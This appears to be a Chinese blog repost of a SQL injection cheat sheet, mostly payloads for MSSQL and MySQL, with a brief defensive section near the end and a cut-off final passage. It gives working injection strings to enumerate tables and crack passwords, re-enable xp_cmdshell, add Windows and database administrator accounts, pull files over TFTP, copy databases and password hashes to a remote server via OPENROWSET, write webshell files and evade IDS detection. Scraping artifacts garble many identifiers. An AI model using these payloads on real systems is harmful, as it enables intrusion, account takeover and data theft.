---
layout:     post
title:      "SQL注入语句大全"
subtitle:   ""
date:       2019-08-03 12:00:00
author:     "bin-xin"
header-img: "img/ES.jpg"
tags:
    - 信息安全
---

> [(转载自CSDN)SQL注入语句大全](https://blog.csdn.net/qq_34306360/article/details/79579527)

<div class="htmledit_views" id="content_views">
                                            <p>1.判断有无注入点&nbsp;<br>; and 1=1 and 1=2</p><p><br>2.猜表一般的表的名称无非是admin adminuser user pass password 等..&nbsp;<br>and 0&lt;&gt;(select count(*) from *)&nbsp;<br>and 0&lt;&gt;(select count(*) from admin) ---判断是否存在admin这张表</p><p>3.猜帐号数目 如果遇到0&lt; 返回正确页面 1&lt;返回错误页面说明帐号数目就是1个&nbsp;<br>and 0&lt;(select count(*) from admin)&nbsp;<br>and 1&lt;(select count(*) from admin)</p><p>4.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称.&nbsp;<br>and 1=(select count(*) from admin where len(*)&gt;0)--&nbsp;<br>and 1=(select count(*) from admin where len(用户字段名称name)&gt;0)&nbsp;<br>and 1=(select count(*) from admin where len(_blank&gt;密码字段名称password)&gt;0)</p><p>5.猜解各个字段的长度 猜解长度就是把&gt;0变换 直到返回正确页面为止&nbsp;<br>and 1=(select count(*) from admin where len(*)&gt;0)&nbsp;<br>and 1=(select count(*) from admin where len(name)&gt;6) 错误&nbsp;<br>and 1=(select count(*) from admin where len(name)&gt;5) 正确 长度是6&nbsp;<br>and 1=(select count(*) from admin where len(name)=6) 正确</p><p>and 1=(select count(*) from admin where len(password)&gt;11) 正确&nbsp;<br>and 1=(select count(*) from admin where len(password)&gt;12) 错误 长度是12&nbsp;<br>and 1=(select count(*) from admin where len(password)=12) 正确</p><p>6.猜解字符&nbsp;<br>and 1=(select count(*) from admin where left(name,1)=a) ---猜解用户帐号的第一位&nbsp;<br>and 1=(select count(*) from admin where left(name,2)=ab)---猜解用户帐号的第二位&nbsp;<br>就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了&nbsp;<br>and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51) --&nbsp;<br>这个查询语句可以猜解中文的用户和_blank&gt;密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.</p><p>group by users.id having 1=1--&nbsp;<br>group by users.id, users.username, users.password, users.privs having 1=1--&nbsp;<br>; insert into users values( 666, attacker, foobar, 0xffff )--</p><p>UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS</p><p>WHERE TABLE_blank&gt;_NAME=logintable-&nbsp;<br>UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS</p><p>WHERE TABLE_blank&gt;_NAME=logintable WHERE COLUMN_blank&gt;_NAME NOT IN (login_blank</p><p>&gt;_id)-&nbsp;<br>UNION SELECT TOP 1 COLUMN_blank&gt;_NAME FROM INFORMATION_blank&gt;_SCHEMA.COLUMNS</p><p>WHERE TABLE_blank&gt;_NAME=logintable WHERE COLUMN_blank&gt;_NAME NOT IN (login_blank</p><p>&gt;_id,login_blank&gt;_name)-&nbsp;<br>UNION SELECT TOP 1 login_blank&gt;_name FROM logintable-&nbsp;<br>UNION SELECT TOP 1 password FROM logintable where login_blank&gt;_name=Rahul--</p><p>看_blank&gt;服务器打的补丁=出错了打了SP4补丁&nbsp;<br>and 1=(select @@VERSION)--</p><p>看_blank&gt;数据库连接账号的权限，返回正常，证明是_blank&gt;服务器角色sysadmin权限。&nbsp;<br>and 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(sysadmin))--</p><p>判断连接_blank&gt;数据库帐号。（采用SA账号连接 返回正常=证明了连接账号是SA）&nbsp;<br>and sa=(SELECT System_blank&gt;_user)--&nbsp;<br>and user_blank&gt;_name()=dbo--&nbsp;<br>and 0&lt;&gt;(select user_blank&gt;_name()--</p><p>看xp_blank&gt;_cmdshell是否删除&nbsp;<br>and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = X AND name = xp_</p><p>blank&gt;_cmdshell)--</p><p>xp_blank&gt;_cmdshell被删除，恢复,支持绝对路径的恢复&nbsp;<br>;EXEC master.dbo.sp_blank&gt;_addextendedproc xp_blank&gt;_cmdshell,xplog70.dll--&nbsp;<br>;EXEC master.dbo.sp_blank&gt;_addextendedproc xp_blank&gt;_cmdshell,c:\inetpub\wwwroot\</p><p>xplog70.dll--</p><p>反向PING自己实验&nbsp;<br>;use master;declare @s int;exec sp_blank&gt;_oacreate "wscript.shell",@s out;exec sp_blank&gt;</p><p>_oamethod @s,"run",NULL,"cmd.exe /c ping 192.168.0.1";--</p><p>加帐号&nbsp;<br>;DECLARE @shell INT EXEC SP_blank&gt;_OACREATE wscript.shell,@shell OUTPUT EXEC SP_blank&gt;</p><p>_OAMETHOD @shell,run,null, C:\WINNT\system32\cmd.exe /c net user jiaoniang$Content$nbsp;1866574 /add--</p><p>创建一个虚拟目录E盘：&nbsp;<br>;declare @o int exec sp_blank&gt;_oacreate wscript.shell, @o out exec sp_blank&gt;_oamethod @o,</p><p>run, NULL, cscript.exe c：\inetpub\wwwroot\mkwebdir.vbs -w "默认Web站点" -v "e","e：\"--</p><p>访问属性：（配合写入一个webshell）&nbsp;<br>declare @o int exec sp_blank&gt;_oacreate wscript.shell, @o out exec sp_blank&gt;_oamethod @o,</p><p>run, NULL, cscript.exe c：\inetpub\wwwroot\chaccess.vbs -a w3svc/1/ROOT/e +browse</p><p>&nbsp;</p><p><br>爆库 特殊_blank&gt;技巧：:%5c=\ 或者</p><p>&nbsp;</p><p>您正在看的SQLserver教程是:sql注入语句。把/和\ 修改%5提交&nbsp;<br>and 0&lt;&gt;(select top 1 paths from newtable)--</p><p>得到库名（从1到5都是系统的id，6以上才可以判断）&nbsp;<br>and 1=(select name from master.dbo.sysdatabases where dbid=7)--&nbsp;<br>and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)&nbsp;<br>依次提交 dbid = 7,8,9.... 得到更多的_blank&gt;数据库名</p><p>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U) 暴到一个表 假设为 admin&nbsp;<br>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in (Admin))</p><p>来得到其他的表。&nbsp;<br>and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin&nbsp;<br>and uid&gt;(str(id))) 暴到UID的数值假设为18779569 uid=id&nbsp;<br>and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id=18779569) 得到一个admin的一个</p><p>字段,假设为 user_blank&gt;_id&nbsp;<br>and 0&lt;&gt;(select top 1 name from bbs.dbo.syscolumns where id=18779569 and name not in&nbsp;<br>(id,...)) 来暴出其他的字段&nbsp;<br>and 0&lt;(select user_blank&gt;_id from BBS.dbo.admin where username&gt;1) 可以得到用户名&nbsp;<br>依次可以得到_blank&gt;密码。。。。。假设存在user_blank&gt;_id username ,password 等字段</p><p>and 0&lt;&gt;(select count(*) from master.dbo.sysdatabases where name&gt;1 and dbid=6)&nbsp;<br>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U) 得到表名&nbsp;<br>and 0&lt;&gt;(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in(Address))&nbsp;<br>and 0&lt;&gt;(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin and uid&gt;(s</p><p>tr(id))) 判断id值&nbsp;<br>and 0&lt;&gt;(select top 1 name from BBS.dbo.syscolumns where id=773577794) 所有字段</p><p>?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,* from admin&nbsp;<br>?id=-1 union select 1,2,3,4,5,6,7,8,*,9,10,11,12,13 from admin (union，access也好用)</p><p><br>[NextPage]</p><p><br>得到WEB路径&nbsp;<br>;create table [dbo].[swap] ([swappass][char](255));--&nbsp;<br>and (select top 1 swappass from swap)=1--&nbsp;<br>;CREATE TABLE newtable(id int IDENTITY(1,1),paths varchar(500)) Declare @test varchar(20) exec master..xp_blank&gt;_regread @rootkey=HKEY_blank&gt;_LOCAL_blank&gt;_MACHINE,</p><p>@key=SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots\, @value_blank</p><p>&gt;_name=/,&nbsp;<a href="mailto:values=@test" rel="nofollow"><span style="color:#506f62;">values=@test</span></a>&nbsp;OUTPUT insert into paths(path) values(@test)--&nbsp;<br>;use ku1;--&nbsp;<br>;create table cmd (str image);-- 建立image类型的表cmd</p><p>存在xp_blank&gt;_cmdshell的测试过程：&nbsp;<br>;exec master..xp_blank&gt;_cmdshell dir&nbsp;<br>;exec master.dbo.sp_blank&gt;_addlogin jiaoniang$;-- 加SQL帐号&nbsp;<br>;exec master.dbo.sp_blank&gt;_password null,jiaoniang$,1866574;--&nbsp;<br>;exec master.dbo.sp_blank&gt;_addsrvrolemember jiaoniang$Content$nbsp;sysadmin;--&nbsp;<br>;exec master.dbo.xp_blank&gt;_cmdshell net user jiaoniang$Content$nbsp;1866574 /workstations:* /</p><p>times:all /passwordchg:yes /passwordreq:yes /active:yes /add;--&nbsp;<br>;exec master.dbo.xp_blank&gt;_cmdshell net localgroup administrators jiaoniang$Content$nbsp;/add;--&nbsp;<br>exec master..xp_blank&gt;_servicecontrol start, schedule 启动_blank&gt;服务&nbsp;<br>exec master..xp_blank&gt;_servicecontrol start, server&nbsp;<br>; DECLARE @shell INT EXEC SP_blank&gt;_OACREATE wscript.shell,@shell OUTPUT EXEC SP</p><p>_blank&gt;_OAMETHOD @shell,run,null, C：\WINNT\system32\cmd.exe /c net user jiaonian</p><p>g$Content$nbsp;1866574 /add&nbsp;<br>;DECLARE @shell INT EXEC SP_blank&gt;_OACREATE wscript.shell,@shell OUTPUT EXEC S</p><p>P_blank&gt;_OAMETHOD @shell,run,null, C：\WINNT\system32\cmd.exe /c net localgroup</p><p>administrators jiaoniang$Content$nbsp;/add&nbsp;<br>; exec master..xp_blank&gt;_cmdshell tftp -i youip get file.exe-- 利用TFTP上传文件</p><p>;declare @a sysname set @a=xp_blank&gt;_+cmdshell exec @a dir c:\&nbsp;<br>;declare @a sysname set @a=xp+_blank&gt;_cm’+’dshell exec @a dir c:\&nbsp;<br>;declare @a;set @a=db_blank&gt;_name();backup database @a to disk=你的IP你的共享目录</p><p>bak.dat 如果被限制则可以。&nbsp;<br>select * from openrowset(_blank&gt;sqloledb,server;sa;,select OK! exec master.dbo.sp_</p><p>blank&gt;_addlogin hax)</p><p>查询构造：&nbsp;<br>SELECT * FROM news WHERE id=... AND topic=... AND .....&nbsp;<br>adminand 1=(select count(*) from</p><p>&nbsp;</p><p>您正在看的SQLserver教程是:sql注入语句。[user] where username=victim and right(left(userp</p><p>ass,01),1)=1) and userpass &lt;&gt;&nbsp;<br>select 123;--&nbsp;<br>;use master;--&nbsp;<br>:a or name like fff%;-- 显示有一个叫ffff的用户哈。&nbsp;<br>and 1&lt;&gt;(select count(email) from [user]);--&nbsp;<br>;update [users] set email=(select top 1 name from sysobjects where xtype=u and</p><p>status&gt;0) where name=ffff;--&nbsp;<br>;update [users] set email=(select top 1 id from sysobjects where xtype=u and nam</p><p>e=ad) where name=ffff;--&nbsp;<br>;update [users] set email=(select top 1 name from sysobjects where xtype=u and i</p><p>d&gt;581577110) where name=ffff;--&nbsp;<br>;update [users] set email=(select top 1 count(id) from password) where name=ffff;--&nbsp;<br>;update [users] set email=(select top 1 pwd from password where id=2) where name=ffff;--&nbsp;<br>;update [users] set email=(select top 1 name from password where id=2) where name=ffff;--&nbsp;<br>上面的语句是得到_blank&gt;数据库中的第一个用户表,并把表名放在ffff用户的邮箱字段中。&nbsp;<br>通过查看ffff的用户资料可得第一个用表叫ad&nbsp;<br>然后根据表名ad得到这个表的ID 得到第二个表的名字</p><p>insert into users values( 666, char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x</p><p>73), char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73), 0xffff)--&nbsp;<br>insert into users values( 667,123,123,0xffff)--&nbsp;<br>insert into users values ( 123, admin--, password, 0xffff)--&nbsp;<br>;and user&gt;0&nbsp;<br>;and (select count(*) from sysobjects)&gt;0&nbsp;<br>;and (select count(*) from mysysobjects)&gt;0 //为access_blank&gt;数据库</p><p>枚举出数据表名&nbsp;<br>;update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status&gt;0);--&nbsp;<br>这是将第一个表名更新到aaa的字段处。&nbsp;<br>读出第一个表，第二个表可以这样读出来（在条件后加上 and name&lt;&gt;刚才得到的表名）。&nbsp;<br>;update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status&gt;0</p><p>and name&lt;&gt;vote);--&nbsp;<br>然后id=1552 and exists(select * from aaa where aaa&gt;5)&nbsp;<br>读出第二个表，一个个的读出，直到没有为止。&nbsp;<br>读字段是这样：&nbsp;<br>;update aaa set aaa=(select top 1 col_blank&gt;_name(object_blank&gt;_id(表名),1));--&nbsp;<br>然后id=152 and exists(select * from aaa where aaa&gt;5)出错，得到字段名&nbsp;<br>;update aaa set aaa=(select top 1 col_blank&gt;_name(object_blank&gt;_id(表名),2));--&nbsp;<br>然后id=152 and exists(select * from aaa where aaa&gt;5)出错，得到字段名</p><p>[获得数据表名][将字段值更新为表名，再想法读出这个字段的值就可得到表名]&nbsp;<br>update 表名 set 字段=(select top 1 name from sysobjects where xtype=u and status&gt;0</p><p>[ and name&lt;&gt;你得到的表名 查出一个加一个]) [ where 条件] select top 1 name from sysobje</p><p>cts where xtype=u and status&gt;0 and name not in(table1,table2,…)&nbsp;<br>通过SQLSERVER注入_blank&gt;漏洞建_blank&gt;数据库管理员帐号和系统管理员帐号[当前帐号必须是SYSADMIN组]</p><p>[获得数据表字段名][将字段值更新为字段名，再想法读出这个字段的值就可得到字段名]&nbsp;<br>update 表名 set 字段=(select top 1 col_blank&gt;_name(object_blank&gt;_id(要查询的数据表名),</p><p>字段列如:1) [ where 条件]</p><p>绕过IDS的检测[使用变量]&nbsp;<br>;declare @a sysname set @a=xp_blank&gt;_+cmdshell exec @a dir c:\&nbsp;<br>;declare @a sysname set @a=xp+_blank&gt;_cm’+’dshell exec @a dir c:\</p><p>1、 开启远程_blank&gt;数据库&nbsp;<br>基本语法&nbsp;<br>select * from OPENROWSET(SQLOLEDB, server=servername;uid=sa;pwd=123, select *</p><p>from table1 )&nbsp;<br>参数: (1) OLEDB Provider name&nbsp;<br>2、 其中连接字符串参数可以是任何端口用来连接,比如&nbsp;<br>select * from OPENROWSET(SQLOLEDB, uid=sa;pwd=123;Network=DBMSSOCN;Address</p><p><br>[NextPage]</p><p><br>=192.168.0.1,1433;, select * from table&nbsp;<br>3.复制目标主机的整个_blank&gt;数据库insert所有远程表到本地表。</p><p>&nbsp;</p><p><br>基本语法：&nbsp;<br>insert into OPENROWSET(SQLOLEDB, server=servername;uid=sa;pwd=123, select *</p><p>from table1) select * from table2&nbsp;<br>这行语句将目标主机上table2表中的所有数据复制到远程_blank&gt;数据库中的table1表中。实际运用</p><p>中适当修改连接字符串的IP地址和端口，指向需要的地方，比如：&nbsp;<br>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address</p><p>=192.168.0.1,1433;,select * from table1) select * from table2&nbsp;<br>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address</p><p>=192.168.0.1,1433;,select * from _blank&gt;_sysdatabases)&nbsp;<br>select * from master.dbo.sysdatabases&nbsp;<br>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address</p><p>=192.168.0.1,1433;,select * from _blank&gt;_sysobjects)&nbsp;<br>select * from user_blank&gt;</p><p><br>您正在看的SQLserver教程是:sql注入语句。_database.dbo.sysobjects&nbsp;<br>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address</p><p>=192.168.0.1,1433;,select * from _blank&gt;_syscolumns)&nbsp;<br>select * from user_blank&gt;_database.dbo.syscolumns&nbsp;<br>复制_blank&gt;数据库：&nbsp;<br>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address</p><p>=192.168.0.1,1433;,select * from table1) select * from database..table1&nbsp;<br>insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Addres</p><p>s=192.168.0.1,1433;,select * from table2) select * from database..table2</p><p>复制哈西表（HASH）登录_blank&gt;密码的hash存储于sysxlogins中。方法如下：&nbsp;<br>insert into OPENROWSET(SQLOLEDB, uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,s</p><p>elect * from _blank&gt;_sysxlogins) select * from database.dbo.sysxlogins&nbsp;<br>得到hash之后，就可以进行暴力破解。</p><p>遍历目录的方法： 先创建一个临时表：temp&nbsp;<br>;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3</p><p>nvarchar(255));--&nbsp;<br>;insert temp exec master.dbo.xp_blank&gt;_availablemedia;-- 获得当前所有驱动器&nbsp;<br>;insert into temp(id) exec master.dbo.xp_blank&gt;_subdirs c:\;-- 获得子目录列表&nbsp;<br>;insert into temp(id,num1) exec master.dbo.xp_blank&gt;_dirtree c:\;-- 获得所有子目录</p><p>的目录树结构,并寸入temp表中&nbsp;<br>;insert into temp(id) exec master.dbo.xp_blank&gt;_cmdshell type c:\web\index.asp;-</p><p>- 查看某个文件的内容&nbsp;<br>;insert into temp(id) exec master.dbo.xp_blank&gt;_cmdshell dir c:\;--&nbsp;<br>;insert into temp(id) exec master.dbo.xp_blank&gt;_cmdshell dir c:\ *.asp /s/a;--&nbsp;<br>;insert into temp(id) exec master.dbo.xp_blank&gt;_cmdshell cscript C:\Inetpub\Admin</p><p>Scripts\adsutil.vbs enum w3svc&nbsp;<br>;insert into temp(id,num1) exec master.dbo.xp_blank&gt;_dirtree c:\;-- （xp_blank&gt;_</p><p>dirtree适用权限PUBLIC）&nbsp;<br>写入表：&nbsp;<br>语句1：and 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(sysadmin));--&nbsp;<br>语句2：and 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(serveradmin));--&nbsp;<br>语句3：and 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(setupadmin));--&nbsp;<br>语句4：and 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(securityadmin));--&nbsp;<br>语句5：and 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(securityadmin));--&nbsp;<br>语句6：and 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(diskadmin));--&nbsp;<br>语句7：and 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(bulkadmin));--&nbsp;<br>语句8：and 1=(SELECT IS_blank&gt;_SRVROLEMEMBER(bulkadmin));--&nbsp;<br>语句9：and 1=(SELECT IS_blank&gt;_MEMBER(db_blank&gt;_owner));--</p><p>把路径写到表中去：&nbsp;<br>;create table dirs(paths varchar(100), id int)--&nbsp;<br>;insert dirs exec master.dbo.xp_blank&gt;_dirtree c:\--&nbsp;<br>and 0&lt;&gt;(select top 1 paths from dirs)--&nbsp;<br>and 0&lt;&gt;(select top 1 paths from dirs where paths not in(@Inetpub))--&nbsp;<br>;create table dirs1(paths varchar(100), id int)--&nbsp;<br>;insert dirs exec master.dbo.xp_blank&gt;_dirtree e:\web--&nbsp;<br>and 0&lt;&gt;(select top 1 paths from dirs1)--</p><p>把_blank&gt;数据库备份到网页目录：下载&nbsp;<br>;declare @a sysname; set @a=db_blank&gt;_name();backup database @a to disk</p><p>=e:\web\down.bak;--</p><p>and 1=(Select top 1 name from(Select top 12 id,name from sysobjects where</p><p>xtype=char(85)) T order by id desc)&nbsp;<br>and 1=(Select Top 1 col_blank&gt;_name(object_blank&gt;_id(USER_blank&gt;_LOGIN)</p><p>,1) from sysobjects) 参看相关表。&nbsp;<br>and 1=(select user_blank&gt;_id from USER_blank&gt;_LOGIN)&nbsp;<br>and 0=(select user from USER_blank&gt;_LOGIN where user&gt;1)</p><p>-=- wscript.shell example -=-&nbsp;<br>declare @o int&nbsp;<br>exec sp_blank&gt;_oacreate wscript.shell, @o out&nbsp;<br>exec sp_blank&gt;_oamethod @o, run, NULL, notepad.exe&nbsp;<br>; declare @o int exec sp_blank&gt;_oacreate wscript.shell, @o out exec sp_blank&gt;</p><p>_oamethod @o, run, NULL, notepad.exe--</p><p>declare @o int, @f int, @t int, @ret int&nbsp;<br>declare @line varchar(8000)&nbsp;<br>exec sp_blank&gt;_oacreate scripting.filesystemobject, @o out&nbsp;<br>exec sp_blank&gt;_oamethod @o, opentextfile, @f out, c:\boot.ini, 1&nbsp;<br>exec @ret = sp_blank&gt;_oamethod @f, readline, @line out&nbsp;<br>while( @ret = 0 )&nbsp;<br>begin&nbsp;<br>print @line&nbsp;<br>exec @ret = sp_blank&gt;_oamethod @f, readline, @line out&nbsp;<br>end</p><p>declare @o int, @f int, @t int</p><p><br>您正在看的SQLserver教程是:sql注入语句。, @ret int&nbsp;<br>exec sp_blank&gt;_oacreate scripting.filesystemobject, @o out&nbsp;<br>exec sp_blank&gt;_oamethod @o, createtextfile, @f out, c:\inetpub\wwwroot\foo.asp, 1&nbsp;<br>exec @ret = sp_blank&gt;_oamethod @f, writeline, NULL,</p><p><br>declare @o int, @ret int&nbsp;<br>exec sp_blank&gt;_oacreate speech.voicetext, @o out&nbsp;<br>exec sp_blank&gt;_oamethod @o, register, NULL, foo, bar&nbsp;<br>exec sp_blank&gt;_oasetproperty @o, speed, 150&nbsp;<br>exec sp_blank&gt;_oamethod @o, speak, NULL, all your sequel servers are belong</p><p>to,us, 528&nbsp;<br>waitfor delay 00:00:05</p><p>; declare @o int, @ret int exec sp_blank&gt;_oacreate speech.voicetext, @o out</p><p>exec sp_blank&gt;_oamethod @o, register, NULL, foo, bar exec sp_blank&gt;_oasetp</p><p>roperty @o, speed, 150 exec sp_blank&gt;_oamethod @o, speak, NULL, all your</p><p>sequel servers are belong to us, 528 waitfor delay 00:00:05--</p><p>xp_blank&gt;_dirtree适用权限PUBLIC&nbsp;<br>exec master.dbo.xp_blank&gt;_dirtree c:\&nbsp;<br>返回的信息有两个字段subdirectory、depth。Subdirectory字段是字符型，depth字段是整形字段。&nbsp;<br>create table dirs(paths varchar(100), id int)&nbsp;<br>建表，这里建的表是和上面xp_blank&gt;_dirtree相关连，字段相等、类型相同。&nbsp;<br>insert dirs exec master.dbo.xp_blank&gt;_dirtree c:\&nbsp;<br>只要我们建表与存储进程返回的字段相定义相等就能够执行！达到写表的效果,一步步达到我们想要的信息！<br><span style="color:#c0c0c0;">文章出处：http://www.diybl.com/course/7_databases/sql/msshl/2007616/59684_2.html</span></p><p><span style="color:#c0c0c0;"></span>&nbsp;********************************************************************************</p><div style="color:rgb(69,69,69);"><p>===MYSQL基础部分===<br>本表查询：<br><a href="http://127.0.0.1/injection/user.php?username=angel%27" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/user.php?username=angel'</span></a>&nbsp;and LENGTH(password)='6<br><a href="http://127.0.0.1/injection/user.php?username=angel%27" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/user.php?username=angel'</span></a>&nbsp;and LEFT(password,1)='m</p><p></p><p>Union联合语句：<br><a href="http://127.0.0.1/injection/show.php?id=1%27" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/show.php?id=1'</span></a>&nbsp;union select 1,username,password from user/*<br><a href="http://127.0.0.1/injection/show.php?id=%27" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/show.php?id='</span></a>&nbsp;union select 1,username,password from user/*</p><p>导出文件：<br><a href="http://127.0.0.1/injection/user.php?username=angel%27" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/user.php?username=angel'</span></a>&nbsp;into outfile 'c:/file.txt<br><a href="http://127.0.0.1/injection/user.php?username=%27" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/user.php?username='</span></a>&nbsp;or 1=1 into outfile 'c:/file.txt<br><a href="http://127.0.0.1/injection/show.php?id=%27" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/show.php?id='</span></a>&nbsp;union select 1,username,password from user into outfile 'c:/user.txt</p><p>INSERT语句：<br>INSERT INTO `user` (userid, username, password, homepage, userlevel) VALUES ('', '$username', '$password', '$homepage', '1');<br>构造homepage值为：<a href="http://blog.csdn.net/" rel="nofollow"><span style="color:#70593f;">http://4ngel.net'</span></a>, '3’)#<br>SQL语句变为：INSERT INTO `user` (userid, username, password, homepage, userlevel) VALUES ('', 'angel', 'mypass', 'http://4ngel.net', '3’)#', '1');</p><p>UPDATE语句：我喜欢这样个东西<br>先理解这句SQL<br>UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='$id'<br>如果此SQL被修改成以下形式，就实现了注入<br>1：修改homepage值为<br><a href="http://blog.csdn.net/" rel="nofollow"><span style="color:#70593f;">http://4ngel.net'</span></a>, userlevel='3<br>之后SQL语句变为<br>UPDATE user SET password='mypass', homepage='http://4ngel.net', userlevel='3' WHERE id='$id'<br>userlevel为用户级别<br>2:修改password值为<br>mypass)' WHERE username='admin'#<br>之后SQL语句变为<br>UPDATE user SET password='MD5(mypass)' WHERE username='admin'#)', homepage='$homepage' WHERE id='$id'<br>3：修改id值为<br>' OR username='admin'<br>之后SQL语句变为<br>UPDATE user SET password='MD5($password)', homepage='$homepage' WHERE id='' OR username='admin'</p><p>===高级部分===<br>常用的MySQL内置函数<br>DATABASE()<br>USER()<br>SYSTEM_USER()<br>SESSION_USER()<br>CURRENT_USER()<br>database()<br>version()<br>SUBSTRING()<br>MID()<br>char()<br>load_file()<br>……<br>函数应用<br>UPDATE article SET title=DATABASE() WHERE id=1<br><a href="http://127.0.0.1/injection/show.php?id=-1" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/show.php?id=-1</span></a>&nbsp;union select 1,database(),version()<br>SELECT * FROM user WHERE username=char(97,110,103,101,108)<br># char(97,110,103,101,108) 相当于angel，十进制<br><a href="http://127.0.0.1/injection/user.php?userid=1" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/user.php?userid=1</span></a>&nbsp;and password=char(109,121,112,97,115,115)http://127.0.0.1/injection/user.php?userid=1 and LEFT(password,1)&gt;char(100)<br><a href="http://127.0.0.1/injection/user.php?userid=1" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/user.php?userid=1</span></a>&nbsp;and ord(mid(password,3,1))&gt;111</p><p>确定数据结构的字段个数及类型<br><a href="http://127.0.0.1/injection/show.php?id=-1" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/show.php?id=-1</span></a>&nbsp;union select 1,1,1<br><a href="http://127.0.0.1/injection/show.php?id=-1" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/show.php?id=-1</span></a>&nbsp;union select char(97),char(97),char(97)</p><p>猜数据表名<br><a href="http://127.0.0.1/injection/show.php?id=-1" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/injection/show.php?id=-1</span></a>&nbsp;union select 1,1,1 from members</p><p>跨表查询得到用户名和密码<br><a href="http://127.0.0.1/ymdown/show.php?id=10000" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/ymdown/show.php?id=10000</span></a>&nbsp;union select 1,username,1,password,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1</p><p>其他<br>#验证第一位密码<br><a href="http://127.0.0.1/ymdown/show.php?id=10" rel="nofollow"><span style="color:#70593f;">http://127.0.0.1/ymdown/show.php?id=10</span></a>&nbsp;union select 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 from ymdown_user where id=1 and ord(mid(password,1,1))=49</p><p>===注入防范===<br>服务器方面<br>magic_quotes_gpc设置为On<br>display_errors设置为Off<br>编码方面<br>$keywords = addslashes($keywords);<br>$keywords = str_replace("_","\_",$keywords);<br>$keywords = str_replace("%","\%",$keywords);<br>数值类型<br>使用intval()抓换<br>字符串类型<br>SQL语句参数中要添加单引号<br>下面代码，用于防治注入<br>if (get_magic_quotes_gpc()) {<br>//....<br>}else{<br>$str = mysql_real_escape_string($str);<br>$keywords = str_replace("_","\_",$keywords);<br>$keywords = str_replace("%","\%",$keywords);<br>}<br>有用的函数<br>stripslashes()<br>get_magic_quotes_gpc()<br>mysql_real_escape_string()<br>strip_tags()<br>array_map()<br>addslashes()<br>参考文章：<br><a href="http://www.phpe.net/mysql_manual/06-4.html" rel="nofollow"><span style="color:#70593f;">http://www.phpe.net/mysql_manual/06-4.html</span></a>（MYSQL语句参考）</p></div><p>&nbsp;</p><p>以下实例，作者angel</p><p><span style="font-weight:700;">php+Mysql的注入</span></p><p>　　国内能看到php+Mysql注入的文章可能比较少，但是如果关注各种WEB程序的漏洞，就可以发现，其实这些漏洞的文章其实就是一个例子。不过由于国内研究PHP的人比研究ASP的人实在少太多，所以，可能没有注意，况且PHP的安全性比ASP高很多，导致很多人不想跨越这个门槛。<br>　　尽管如此，在PHP站点日益增多的今天，SQL注入仍是最有效最麻烦的一种攻击方式，有效是因为至少70% 以上的站点存在SQL Injection漏洞，包括国内大部分安全站点，麻烦是因为MYSQL4以下的版本是不支持子语句的，而且当php.ini里的 magic_quotes_gpc 为On 时。提交的变量中所有的 ' (单引号), " (双引号), \ (反斜线) and 空字符会自动转为含有反斜线的转义字符。给注入带来不少的阻碍。<br>　　